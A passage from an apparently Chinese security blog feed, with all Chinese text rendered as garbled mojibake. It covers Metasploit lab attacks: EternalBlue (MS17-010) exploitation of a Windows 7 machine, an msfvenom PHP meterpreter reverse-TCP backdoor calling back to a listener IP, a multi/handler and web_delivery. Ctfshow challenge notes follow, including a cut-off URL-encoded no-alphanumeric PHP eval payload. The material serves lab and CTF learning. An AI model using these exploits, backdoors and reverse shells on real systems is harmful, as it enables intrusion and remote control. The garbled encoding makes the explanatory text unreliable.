src="../images/image-20230309215018768.png" alt="image-20230309215018768"></p><p>è¿™é‡Œçš„è¯æ˜¯requiredä¸Šå†™çš„yesæ˜¯å¿…é¡»çš„å¾—æ·»åŠ çš„å€¼</p><p>thredsæ˜¯çº¿ç¨‹çš„æ„æ€</p><p><strong>4.ä½¿ç”¨ run æˆ–è€… exploit å‘½ä»¤å³å¯æˆåŠŸæŸ¥è¯¢ï¼Œå¯ä»¥çœ‹åˆ°ï¼ŒHost is likely VULNERABLE to MS17-010!ã€ä¸»æœºå¯èƒ½å®¹æ˜“å—åˆ°MS17-010çš„æ”»å‡»!ã€‘ï¼Œè¯æ˜å¯èƒ½å­˜åœ¨æ°¸æ’ä¹‹è“æ¼æ´ï¼Œä¸‹é¢å¼€å§‹åˆ©ç”¨</strong></p><p><img src="../images/image-20230309215259140.png" alt="image-20230309215259140"></p><p><strong>5.æ¼æ´åˆ©ç”¨</strong></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œæ¼æ´åˆ©ç”¨äº†ï¼Œå°±æ˜¯ä½¿ç”¨expolit</p><p><img src="../images/image-20230309215405622.png" alt="image-20230309215405622"></p><p>win7éœ€è¦ä½¿ç”¨exploit/windows/smb/ms17_010_eternalblue</p><p>windows2003ä½¿ç”¨exploit/windows/smb/ms17_010_psexec</p><p>æ‰€ä»¥æˆ‘ç›´æ¥<strong>use exploit/windows/smb/ms17_010_eternalblue</strong></p><p><img src="../images/image-20230309215644933.png" alt="image-20230309215644933"></p><p><img src="../images/image-20230309215658099.png" alt="image-20230309215658099"></p><p>è®¾ç½®å®Œæˆåï¼Œæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹runäº†</p><p><strong>6.å¼€å§‹run</strong></p><p><img src="../images/image-20230309215807989.png" alt="image-20230309215807989"></p><p>æˆåŠŸäº†ï¼Œæ‹¿åˆ°<strong>meterpreter</strong>çš„è¯å°±æ˜¯æˆåŠŸæ‹¿ä¸‹ç›®æ ‡æœºå™¨äº†</p><p><img src="../images/image-20230309215904446.png" alt="image-20230309215904446"></p><p>æˆ‘ä»¬å¯ä»¥è¾“å…¥ï¼Ÿæ¥æŸ¥çœ‹å…¶ä»–å‘½ä»¤ï¼Œç„¶ååˆ©ç”¨è¿™äº›å‘½ä»¤æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p><p>è¾“å…¥shellçš„è¯å°±æ˜¯å¯ä»¥æ‹¿åˆ°ç›®æ ‡æœºå™¨çš„cmdäº†</p><p><img src="../images/image-20230309220109374.png" alt="image-20230309220109374"></p><p>æƒ³å¯¹ç›®æ ‡æœºå™¨å¹²å•¥å°±ç›´æ¥å»çœ‹ï¼Ÿç»™å‡ºçš„æŒ‡ä»¤äº†ã€‚</p><p>å¯¹win7è¾“å…¥netstat -anæŒ‡ä»¤çš„è¯ï¼Œå°±å¯ä»¥çœ‹åˆ°æœ¬åœ°çš„64392ç«¯å£è¢«192.168.3.110ï¼š4444ç›‘å¬ï¼Œåå¼¹shellæˆåŠŸ</p><p><img src="../images/image-20230309220254984.png" alt="image-20230309220254984"></p><p>è‡³æ­¤  æ°¸æ’ä¹‹è“æ¼æ´å°±å¤ç°æˆåŠŸäº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯¹msfä¹Ÿæœ‰ä¸€ç‚¹äº†è§£äº†ã€‚</p><p>nmap -sn -PE -n 172.22.81.1/24 -oX out.xml    â€”&gt;   è¿™å°±æ˜¯æ‰«cæ®µçš„</p><p>  -sn ä¸æ‰«æç«¯å£            -PE <a href="https://so.csdn.net/so/search?q=ICMP&amp;spm=1001.2101.3001.7020">ICMP</a>æ‰«æ</p><p>   -nä¸è¿›è¡Œ<a href="https://so.csdn.net/so/search?q=dnsè§£æ&amp;spm=1001.2101.3001.7020">dnsè§£æ</a>           -oX è¾“å‡ºç»“æœ</p><h3 id="åˆ©ç”¨Msfvenomå†™å…¥åé—¨"><a href="#åˆ©ç”¨Msfvenomå†™å…¥åé—¨" class="headerlink" title="åˆ©ç”¨Msfvenomå†™å…¥åé—¨"></a>åˆ©ç”¨Msfvenomå†™å…¥åé—¨</h3><p>msfvenom a Metasploit standalone payload generatorï¼ŒAlso a replacement for msfpayload and msfencode.æ˜¯ç”¨æ¥ç”Ÿæˆåé—¨çš„è½¯ä»¶ã€‚<br>MSFvenomæ˜¯Msfpayloadå’ŒMsfencodeçš„ç»„åˆï¼Œå°†è¿™ä¸¤ä¸ªå·¥å…·éƒ½æ”¾åœ¨ä¸€ä¸ªFrameworkå®ä¾‹ä¸­ã€‚è‡ª2015å¹´6æœˆ8æ—¥èµ·ï¼Œmsfvenomæ›¿æ¢äº†msfpayloadå’Œmsfencodeã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">-l, --<span class="keyword">list</span> &lt;type&gt; åˆ—å‡ºæŒ‡å®šæ¨¡å—çš„æ‰€æœ‰å¯ç”¨èµ„æº. æ¨¡å—ç±»å‹åŒ…æ‹¬: payloads, encoders, nops,......all</span><br><span class="line"> </span><br><span class="line">-p, --payload &lt; payload&gt; æŒ‡å®šéœ€è¦ä½¿ç”¨çš„<span class="title function_ invoke__">payload</span>(æ”»å‡»è·è½½)ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰payload,å‡ ä¹æ˜¯æ”¯æŒå…¨å¹³å°çš„</span><br><span class="line"> </span><br><span class="line">-f, --format &lt; format&gt; æŒ‡å®šè¾“å‡ºæ ¼å¼</span><br><span class="line"> </span><br><span class="line">-e, --encoder &lt;encoder&gt; æŒ‡å®šéœ€è¦ä½¿ç”¨çš„encoderï¼ˆç¼–ç å™¨ï¼‰ï¼ŒæŒ‡å®šéœ€è¦ä½¿ç”¨çš„ç¼–ç ï¼Œå¦‚æœæ—¢æ²¡ç”¨-eé€‰é¡¹ä¹Ÿæ²¡ç”¨-bé€‰é¡¹ï¼Œåˆ™è¾“å‡ºraw payload</span><br><span class="line"> </span><br><span class="line">-a, --arch &lt; architecture&gt; æŒ‡å®špayloadçš„ç›®æ ‡æ¶æ„ï¼Œä¾‹å¦‚x86 è¿˜æ˜¯ x64 è¿˜æ˜¯ x86_64</span><br><span class="line"> </span><br><span class="line">-o, --out &lt; path&gt; æŒ‡å®šåˆ›å»ºå¥½çš„payloadçš„å­˜æ”¾ä½ç½®</span><br><span class="line"> </span><br><span class="line">-b, --bad-chars &lt; <span class="keyword">list</span>&gt; è®¾å®šè§„é¿å­—ç¬¦é›†ï¼ŒæŒ‡å®šéœ€è¦è¿‡æ»¤çš„åå­—ç¬¦ã€‚ä¾‹å¦‚ï¼šä¸ä½¿ç”¨ <span class="string">&#x27;\x0f&#x27;</span>ã€<span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"> </span><br><span class="line">-n, --nopsled &lt; length&gt; ä¸ºpayloadé¢„å…ˆæŒ‡å®šä¸€ä¸ªNOPæ»‘åŠ¨é•¿åº¦</span><br><span class="line"> </span><br><span class="line">-s, --space &lt; length&gt; è®¾å®šæœ‰æ•ˆæ”»å‡»è·è½½çš„æœ€å¤§é•¿åº¦ï¼Œå°±æ˜¯æ–‡ä»¶å¤§å°</span><br><span class="line"> </span><br><span class="line">-i, --iterations &lt; count&gt; æŒ‡å®špayloadçš„ç¼–ç æ¬¡æ•°</span><br><span class="line"> </span><br><span class="line">-c, --add-code &lt; path&gt; æŒ‡å®šä¸€ä¸ªé™„åŠ çš„win32 shellcodeæ–‡ä»¶</span><br><span class="line"> </span><br><span class="line">-x, --template &lt; path&gt; æŒ‡å®šä¸€ä¸ªè‡ªå®šä¹‰çš„å¯æ‰§è¡Œæ–‡ä»¶ä½œä¸ºæ¨¡æ¿,å¹¶å°†payloadåµŒå…¥å…¶ä¸­</span><br><span class="line"> </span><br><span class="line">-k, --keep ä¿æŠ¤æ¨¡æ¿ç¨‹åºçš„åŠ¨ä½œï¼Œæ³¨å…¥çš„payloadä½œä¸ºä¸€ä¸ªæ–°çš„è¿›ç¨‹è¿è¡Œ</span><br><span class="line"> </span><br><span class="line">-v, --<span class="keyword">var</span>-name &lt; value&gt; æŒ‡å®šä¸€ä¸ªè‡ªå®šä¹‰çš„å˜é‡ï¼Œä»¥ç¡®å®šè¾“å‡ºæ ¼å¼</span><br><span class="line"> </span><br><span class="line">-t, --timeout &lt;second&gt; ä»stdinè¯»å–æœ‰æ•ˆè´Ÿè½½æ—¶ç­‰å¾…çš„ç§’æ•°ï¼ˆé»˜è®¤ä¸º<span class="number">30</span>ï¼Œ<span class="number">0</span>è¡¨ç¤ºç¦ç”¨ï¼‰</span><br><span class="line"> </span><br><span class="line">-h,--help æŸ¥çœ‹å¸®åŠ©é€‰é¡¹</span><br><span class="line"> </span><br><span class="line">--platform &lt; platform&gt; æŒ‡å®špayloadçš„ç›®æ ‡å¹³å°</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¯è¿™äº›å‘½ä»¤çš„è¯ä¸ç”¨è®°å¾—ï¼Œå¤šç”¨å‡ æ¬¡å‘½ä»¤å°±ç†Ÿæ‚‰äº†</p><p>è¿™é‡Œçš„è¯å…ˆæŸ¥çœ‹ä¸€ä¸‹å“ªäº›åé—¨å·¥å…·å¯ä»¥è¿›è¡Œåˆ©ç”¨</p><p><code>msfvenom -l payload | grep &#39;windows&#39; | awk &#39;&#123;print $1&#125;&#39;</code></p><p>grep â€”&gt;  æ˜¯linuxä¸­çš„æ–‡æœ¬åŒ¹é…è¯­å¥  è¿™é‡Œå°±æ˜¯è¾“å‡ºæœ‰windowsçš„payload</p><p>awk  â€”&gt;æ˜¯æ–‡æœ¬æ‰“å°å·¥å…·  <a href="https://www.cnblogs.com/ggjucheng/archive/2013/01/13/2858470.html">awk</a></p><p><img src="../images/image-20230310161327640.png" alt="image-20230310161327640"></p><p>å°±ä¼šå‡ºç°ä¸€å †payloadï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä»ä¸­é€‰ä¸€ä¸ªè¿›è¡Œåˆ©ç”¨</p><p>è¿™é‡Œæˆ‘ä»¬é€‰ä¸€ä¸ªphpçš„payloadï¼Œè¿™é‡Œçš„è¯å› ä¸ºæ˜¯é¶æœºçš„è¯ï¼Œç„¶åæ²¡æœ‰ä¸€äº›ç¼–ç¨‹è¯­è¨€ç¯å¢ƒçš„è¯ï¼Œpayloadåˆ°é‚£è¾¹æ˜¯æ‰§è¡Œä¸äº†çš„(æˆ‘ä»¬åœ¨é¶æœºä¸Šå°±å¾—æ„å»ºä¸€ä¸ªphpstudyæ¥æ‰§è¡Œè¿™ä¸ªç”Ÿæˆçš„åé—¨ä»£ç )</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp lhost=<span class="number">172.29</span>.<span class="number">76.20</span> lport=<span class="number">5555</span> -f raw &gt;a.php</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230310162542496.png" alt="image-20230310162542496"></p><p>æˆåŠŸç”Ÿæˆäº†phpçš„ä»£ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æŠŠç”Ÿæˆçš„phpä»£ç å¤åˆ¶åˆ°é¶æœºä¸Š</p><p>è¿™é‡Œè¯å¾—åœ¨win7é¶æœºä¸Šå®‰è£…phpstudyå’Œ<a href="https://segmentfault.com/a/1190000040641247">è¡¥ä¸</a>  è¡¥ä¸æ˜¯ä¸ºäº†æˆåŠŸå®‰è£…vmtools</p><p>å¥½æŠŠa.phpæ‹–è¿›å»(æ‹–åˆ°wwwç›®å½•ä¸‹)</p><p><img src="../images/image-20230310170804761.png" alt="image-20230310170804761"></p><p>æˆåŠŸæ‰˜è¿›å»</p><p>åœ¨æ‰§è¡Œa.phpæ–‡ä»¶ä¹‹å‰  æˆ‘ä»¬å¾—åœ¨kaliæ”»å‡»æœºä¸Šå¼€å¯ç›‘å¬</p><p><img src="../images/image-20230310171148353.png" alt="image-20230310171148353"></p><p>ä½¿ç”¨ç›‘å¬æ¨¡å—è¿›è¡Œç›‘å¬</p><p><code>use exploit/multi/handler</code></p><p><code>set payload php/meterpreter_reverse_tcp</code></p><p>å› ä¸ºæˆ‘ä»¬æ˜¯ä½¿ç”¨php/meterpreter_reverse_tcpå†™çš„åé—¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›‘å¬çš„è¯è¿˜æ˜¯å¾—ç”¨å®ƒ</p><p>è¿™é‡Œçš„<code>reverse_tcp</code>å’Œ<code>reverse_http</code>çš„åŒºåˆ«æ˜¯ï¼Œtcpèƒ½æŒ‡å®šä»»æ„ç«¯å£ï¼Œhttpåªèƒ½æŒ‡å®š80ç«¯å£</p><p><img src="../images/image-20230310171433064.png" alt="image-20230310171433064"></p><p><img src="../images/image-20230310171801516.png" alt="image-20230310171801516"></p><p><img src="../images/image-20230310171816219.png" alt="image-20230310171816219"></p><p>åœ¨é¶æœºä¸Šè®¿é—®a.phpçš„æ—¶å€™ï¼Œkaliç›‘å¬å°±æ‹¿åˆ°äº†meterpreteräº†ã€‚</p><p>ä¸Šé¢æˆ‘ä»¬ä½¿ç”¨çš„phpæ˜¯å±äºwebçš„payload,é‚£ä¹ˆæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨è„šæœ¬payloadæ¥è¿›è¡Œæ‹¿meterpreter</p><p>è¿™ç¯‡æ–‡ç« è¿›è¡Œäº†å¾ˆå¥½çš„è¡¥å……  â€”-&gt;   <a href="https://blog.csdn.net/qq_48985780/article/details/121441548">æ–‡ç« </a></p><p>ä¸Šé¢æ˜¯ä¼ çš„phpä»£ç ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬æ¥ä¼ exeæ–‡ä»¶</p><p>åˆ©ç”¨msfæ”»å‡»windows  å°±æ˜¯ç•™ä¸‹åé—¨</p><p>è¿™é‡Œçš„åˆ©ç”¨webshellçš„æ„æ€æ˜¯å½“é¶æœºå­˜åœ¨å‘½ä»¤æ‰§è¡Œæˆ–è€…è¿œç¨‹æ¼æ´æ‰§è¡Œæ¼æ´æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œåˆ©ç”¨ï¼Œä»è€Œæ‹¿ä¸‹é¶æœºçš„æ§åˆ¶æƒ</p><p>è¿™é‡Œåˆ©ç”¨çš„æ˜¯web_delivery</p><p><img src="../images/image-20230310180232793.png" alt="image-20230310180232793"></p><p><img src="../images/image-20230310180529065.png" alt="image-20230310180529065"></p><p>è¿™é‡Œä½¿ç”¨çš„æ˜¯phpåå¼¹shellè„šæœ¬ </p><p>å’Œä¸Šé¢ç”Ÿæˆçš„a.phpæ˜¯ä¸€ä¸ªæ„æ€</p><p>è¿™é‡Œç”Ÿæˆäº†ä¸€ä¸ªphpä»£ç   ç„¶åæˆ‘ä»¬å¤åˆ¶ä¹‹åæ‹¿å»ping  å½“ç„¶æ˜¯ä¸èƒ½æˆåŠŸçš„ï¼Œå› ä¸ºå°±æ˜¯é¶æœºæ²¡æœ‰phpçš„ç¯å¢ƒå˜é‡ï¼Œæ‰€ä»¥ä¸èƒ½æ‰§è¡Œphpä»£ç </p>]]></content>
      
      
      
        <tags>
            
            <tag> æ¸—é€å…¥é—¨1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-å¸¸ç”¨å§¿åŠ¿ åˆ·é¢˜è®°å½•</title>
      <link href="/posts/66e9d03e.html"/>
      <url>/posts/66e9d03e.html</url>
      
        <content type="html"><![CDATA[<p>è¿™é‡ŒåŒ…æ‹¬å¤šç§ç±»å‹çš„é¢˜ç›®  ä¸ºå¸¸è§çš„å§¿åŠ¿  ç”¨äºç§¯ç´¯è‡ªå·±çš„æ–¹æ³•åº“</p><h2 id="web801-flaskç®—pin"><a href="#web801-flaskç®—pin" class="headerlink" title="web801(flaskç®—pin)"></a>web801(flaskç®—pin)</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230303200038182.png" alt="image-20230303200038182"></p><p><strong>æ¡ä»¶: flask debugæ¨¡å¼å¼€å¯ å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–</strong></p><p>è¿™é‡Œçš„è¯æ˜¯pythonç‰ˆæœ¬çš„ä¸åŒï¼Œé‚£ä¹ˆè®¡ç®—pinç çš„è„šæœ¬ä¹Ÿæ˜¯ä¸ç›¸åŒçš„ï¼ŒåŸå› å°±åœ¨äºåŠ å¯†æ–¹å¼ä¸ç›¸åŒã€‚</p><p>python3.6æ˜¯MD5åŠ å¯†ï¼Œpython3.8æ˜¯sha1åŠ å¯†</p><p><a href="https://blog.csdn.net/weixin_54648419/article/details/123632203">è¯¦ç»†çš„wp </a>è¿™ç¯‡æ–‡ç« å†™çš„éå¸¸è¯¦ç»†äº†ï¼Œæˆ‘è¿™é‡Œå°±ä¸å†™äº†ã€‚</p><h2 id="web802-æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ"><a href="#web802-æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web802( æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ)"></a>web802( <strong>æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ</strong>)</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]/i&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¯ç½‘ä¸Šæœ‰å¾ˆå¤šç§æ–¹æ³•æ¥è¿›è¡Œè¿™ä¸ªç»•è¿‡ï¼Œè¿™é‡Œå°±ä¸å¤šèµ˜è¿°äº†</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">5</span>B%<span class="number">5</span>D%<span class="number">2</span>E%<span class="number">27</span>%<span class="number">27</span>%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>B%<span class="number">27</span>%<span class="number">27</span>%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">27</span>%<span class="number">24</span>%<span class="number">27</span>%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">27</span>%<span class="number">5</span>F%<span class="number">27</span>%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>E%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>E%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>E%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span 